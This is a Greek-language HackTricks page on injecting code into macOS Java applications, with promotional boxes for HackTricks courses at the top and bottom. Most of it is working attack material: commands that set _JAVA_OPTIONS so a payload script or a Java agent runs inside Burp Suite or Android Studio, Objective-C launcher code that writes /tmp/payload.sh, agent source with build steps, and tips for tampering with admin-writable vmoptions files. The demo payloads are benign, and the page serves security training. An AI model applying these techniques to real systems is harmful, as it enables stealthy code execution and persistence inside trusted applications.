# Εισαγωγή σε εφαρμογές Java στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Απαρίθμηση

Βρείτε εγκατεστημένες εφαρμογές Java στο σύστημά σας. Παρατηρήθηκε ότι οι εφαρμογές Java στο **Info.plist** θα περιέχουν ορισμένες παραμέτρους Java που περιέχουν τον χαρακτήρα **`java.`**, οπότε μπορείτε να αναζητήσετε γι' αυτόν:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA\_OPTIONS

Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για να εισαχθούν αυθαίρετες παράμετροι Java κατά την εκτέλεση μιας εφαρμογής που έχει μεταγλωττιστεί σε Java:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Για να το εκτελέσετε ως ένα νέο διεργασία και όχι ως παιδί του τρέχοντος τερματικού, μπορείτε να χρησιμοποιήσετε:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ωστόσο, αυτό θα προκαλέσει ένα σφάλμα στην εκτελούμενη εφαρμογή. Ένας πιο αόρατος τρόπος είναι να δημιουργήσετε έναν Java agent και να χρησιμοποιήσετε:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
{% hint style="danger" %}
Η δημιουργία του πράκτορα με μια **διαφορετική έκδοση της Java** από την εφαρμογή μπορεί να προκαλέσει την κατάρρευση της εκτέλεσης τόσο του πράκτορα όσο και της εφαρμογής.
{% endhint %}

Όπου ο πράκτορας μπορεί να είναι:

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
{% endcode %}

Για να συντάξετε τον πράκτορα, εκτελέστε:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Με το `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Και στη συνέχεια εξαγάγετε τη μεταβλητή περιβάλλοντος και εκτελέστε την εφαρμογή Java ως εξής:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## Αρχείο vmoptions

Αυτό το αρχείο υποστηρίζει την καθορισμό των **παραμέτρων Java** κατά την εκτέλεση της Java. Μπορείτε να χρησιμοποιήσετε μερικά από τα προηγούμενα κόλπα για να αλλάξετε τις παραμέτρους Java και να **κάνετε τη διεργασία να εκτελέσει αυθαίρετες εντολές**.\
Επιπλέον, αυτό το αρχείο μπορεί να **περιλαμβάνει άλλα αρχεία** με τον κατάλογο `include`, οπότε μπορείτε επίσης να αλλάξετε ένα περιλαμβανόμενο αρχείο.

Επιπλέον, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα αρχεία `vmoptions`**.

Ορισμένες εφαρμογές όπως το Android Studio δείχνουν στην **έξοδό τους πού ψάχνουν** για αυτά τα αρχεία, όπως:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Εάν δεν το κάνουν, μπορείτε εύκολα να το ελέγξετε με:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Παρατηρήστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, ένα μέρος όπου οποιοσδήποτε χρήστης από την ομάδα **`admin` έχει δικαιώματα εγγραφής**.

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
